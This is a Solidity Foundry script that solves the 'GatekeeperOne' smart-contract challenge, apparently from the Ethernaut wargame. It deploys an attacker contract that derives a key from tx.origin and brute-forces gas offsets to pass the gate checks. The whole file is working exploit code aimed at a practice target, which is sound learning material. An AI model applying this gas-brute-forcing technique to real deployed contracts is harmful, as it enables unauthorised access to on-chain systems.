// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { GatekeeperOne } from "../src/13_GatekeeperOne.sol";

contract Attacker {

  GatekeeperOne challenge;

  constructor(address challengeInstanceAddress) {
    challenge = GatekeeperOne(challengeInstanceAddress);
  }

  function attack() public {
    uint16 addressToInt = uint16(uint160(tx.origin));
    bytes8 key = bytes8(uint64(addressToInt + 2**60));
    for(uint i;i<120;i++){
      (bool success, ) = address(challenge).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", key));
      if(success) break;
    }
  }

}

contract GatekeeperOneAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("GatekeeperOne"));

    vm.startBroadcast(deployerPrivateKey);
    Attacker attacker = new Attacker(challengeInstanceAddress);
    attacker.attack();
    console.log("Entrant: %s", address(GatekeeperOne(challengeInstanceAddress).entrant()));
    vm.stopBroadcast();
  }

}